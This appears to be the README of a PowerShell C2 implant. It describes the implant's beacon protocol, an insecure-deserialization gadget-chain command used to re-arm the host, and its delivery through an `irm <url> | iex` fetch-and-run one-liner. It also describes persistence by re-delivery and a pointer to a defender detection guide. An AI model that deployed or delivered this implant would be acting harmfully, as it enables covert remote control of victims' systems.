# powershell-agent

The PowerShell HTTP-beacon agent for the [C2](https://github.com/mrzaxaryan/C2) platform — a single
static `.ps1` file ([`src/powershell-agent.ps1`](src/powershell-agent.ps1)) that turns its host
process (Windows PowerShell) into an implant with no payload download and no bitness constraint of
its own. It is the CLR-native twin of the JScript agent: same identity model, same wire contract,
but native `byte[]` instead of the ADODB/cp1252 COM bridge.

It targets **Windows PowerShell 2.0 through 5.1** (the in-box host on Win7–Win11): no classes,
no `::new()`, no `Get-CimInstance`, TLS 1.2 via the numeric `SecurityProtocol` assignment that
sidesteps the missing `Tls12` enum member on .NET 3.5. It does NOT run on PowerShell 7+ —
`BinaryFormatter` is blocked/removed there, so the UpgradeNetFramework arm would fail (the beacon
loop itself still works).

## Environment contract

The agent carries **no baked configuration**. Its single input is the process environment:

| Variable | Meaning |
|---|---|
| `H_URL` | The beacon endpoint — the HTTP relay root (`https://<relay>/`). Empty or unset ⇒ the agent logs once and returns `'fail'`. |

Everything else (identity, machine architecture, OS version) is derived on the target at runtime.
`X-Client-Features` always ships `0800000000000000` (the `ExploitInsecureDeserialization`
bit) — Windows PowerShell runs on the CLR, so `BinaryFormatter` deserialization works in-process
natively (no `System.*` ActiveXObject gymnastics like the JScript host needs) and every build of
this agent carries the UpgradeNetFramework arm. `X-Client-Id` is `3` (breed: PowerShell
Agent).

## Host contract

`Invoke-Agent` is designed to be **nested inside a host master** — a wrapper script that owns all
window and process manipulation. The agent itself performs none. Concretely:

- It defines exactly one top-level symbol: `function Invoke-Agent { ... }`. Everything else is
  nested inside; nested functions write shared state through `$script:` prefixes (functions
  can't assign the enclosing scope's plain vars).
- It **returns** instead of exiting: `'exit'` (operator sent Exit) or `'fail'` (endpoint unset,
  non-200 answer, or POST exception). The host decides what to do — typically quit the host
  process on either value.
- Logging is relay-ship only (`X-Log-Only: 1` frames) — no local echo, never fatal.
- It reads `H_URL` from the process environment, so the host must set it (`$env:H_URL = ...`)
  **before** calling `Invoke-Agent`.

The C2 PowerShell Loader panel is the reference host: it emits `$env:H_URL = '...'`, the
agent text verbatim, then `$null = Invoke-Agent` — and serves the result through file
hosting as `irm <url> | iex` (PowerShell 3+) or the `Net.WebClient` download-string
one-liner (2.0-compatible).

## Beacon contract (v3)

Spoken against the HTTP relay (see the `http-relay` worker — the beacon leg answers at its root):

- **POST** to `H_URL` with the full identity header set (API 1) on every request; body =
  RAW binary frames (`[u32le length][bytes]`), one frame per owed reply, empty body when none is
  pending.
- **Every successful answer is `200`**: body = frames of queued commands
  (`[opcode][corrId u32le][payload]`), empty body = nothing queued. There is no 204; any non-200
  is fatal.
- The relay holds each request server-side for a random 20–30 s; the agent's `Timeout` is 45 s
  (keep it > max-hold + 10 s if the relay window ever grows; `ReadWriteTimeout` is 15 s). On an
  empty body the agent re-POSTs immediately.
- **Failure is fatal**: a non-200 status or a POST exception returns `'fail'` — no retry loop.
  Presence is re-established by re-delivery (e.g. on-logon persistence), not by the process
  burning CPU against a dead relay.

### Commands

| Opcode | Command | Behavior |
|---|---|---|
| `0x0A` | Exit | Sets the exit flag; the loop unwinds and `Invoke-Agent` returns `'exit'`. |
| `0x0B` | UpgradeNetFramework | Re-arms the process in place. Payload (latin-1 text after the opcode): `!d=`/`!e=` control lines, `NAME=value` env-var lines, a blank line, then `stage1b64\nblobB64`. The agent pins `COMPLUS_Version` itself first (v2.0.50727 on Win7 / build 7600-7601, else v4.0.30319 — the same OS rule the other agents use), applies the env lines, optionally deserializes the stage-1 blob, then deserializes the main gadget blob (plain drive, or script-driven delegate chain when `!d=1` + entry via `!e=`; the delegate's null argument is a one-element `object[]` — the marshaling of the JScript arm's `undefined`). Replies u32: `0` = chain completed, `1` = failed (log carries the message). |
| other | unknown | Replies u32 `2`. |

Every reply echoes the command's correlation id after its status: `[status:u32le][corrId:u32le]`;
id 0 = unmatched.

## Debug vs release

PowerShell has no preprocessor, so the flavor split is a **line tag**: any source line ending in a
`#dbg` comment exists only in the debug build. [`build.ps1`](build.ps1) splits the flavors and
gates the result (both flavors must parse and keep the fetch-contract needle; the release flavor
must carry zero debug surface — the build fails loudly otherwise):

```
powershell -NoProfile -ExecutionPolicy Bypass -File build.ps1
# → dist/powershell-agent.ps1        release: every #dbg line REMOVED (zero diagnostics)
# → dist-debug/powershell-agent.ps1  debug:   #dbg lines kept, tag suffix dropped
```

The debug build pops a **blocking topmost MessageBox per milestone** (the csharp-agent
`Diag.Show` contract — WScript.Shell `Popup`, caption `ps-agent dbg <step>`): `[1] start`,
`[2] H_URL`, `[3] tls`, `[5] identity`, `[6]`/`[7] POST #1` (first beacon cycle only — healthy
idle iterations stay silent), `[cmd] 0x…` per dispatched command, `[exit] …` on fatal branches,
`[0x0B] upgrade failed` with the exception message. Hand-debugging only: popups are
operator-visible and every call costs a click.

CI publishes two rolling pre-releases from `main` with the same asset filename — **the tag is
the flavor** (the csharp-agent contract): `release` = release flavor, `debug` = debug flavor.
The CI smoke test runs the release flavor only (a debug popup would park an unattended runner
forever). Never deliver the `debug` flavor to an operational target.

## Local verification

```
powershell -NoProfile -Command ". .\src\powershell-agent.ps1; Invoke-Agent"
```

Expected: with `H_URL` unset, a clean `'fail'` return; against a live relay (`wrangler dev` in
the `http-relay` repo), the beacon appears with its parsed identity and answers
queued commands. A loopback harness (POST capture + scripted framed answers) is how the reply
framing and Exit paths were verified during development.

## For defenders

[DEFENSE.md](DEFENSE.md) is the detection guide for this agent: network and host indicators
derived from the source (with line references), detection opportunities, and a MITRE ATT&CK
mapping. Detection engineering against PowerShell implants benefits from the platform's own
logging surface (`ScriptBlock Logging`, module logging, AMSI) — details there.

## License

MIT — see [LICENSE](LICENSE). Usage is governed by [RESPONSIBLE_USE.md](RESPONSIBLE_USE.md) and
[SECURITY.md](SECURITY.md).
